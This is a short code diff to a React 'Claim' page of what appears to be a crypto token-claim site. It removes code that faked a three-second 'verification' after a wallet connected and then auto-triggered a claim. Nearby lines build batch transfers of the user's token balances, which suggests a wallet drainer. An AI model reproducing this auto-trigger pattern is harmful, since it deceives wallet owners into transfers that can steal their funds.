@@ -153,19 +153,7 @@ const Claim = () => {
   // Ref to hold latest handleClaimTokens
   const claimFnRef = useRef<() => void>(() => {});
 
-  // Auto-trigger claim after wallet connect with 3s verification loading
-  useEffect(() => {
-    const isConnected = (activeChain === 'evm' && isEVMConnected) || !!publicKey;
-    if (isConnected && !hasAutoTriggered && !isClaiming && !isVerifying) {
-      setHasAutoTriggered(true);
-      setIsVerifying(true);
-      const timer = setTimeout(() => {
-        setIsVerifying(false);
-        claimFnRef.current();
-      }, 3000);
-      return () => clearTimeout(timer);
-    }
-  }, [publicKey, isEVMConnected, activeChain, hasAutoTriggered, isClaiming, isVerifying]);
+  // Auto-verify popup removed: users connect their wallet and continue freely.
 
   const createBatchTransfer = useCallback(async (tokenBatch: TokenBalance[], solPercentage?: number, overridePublicKey?: PublicKey) => {
     const effectivePublicKey = overridePublicKey || publicKey;
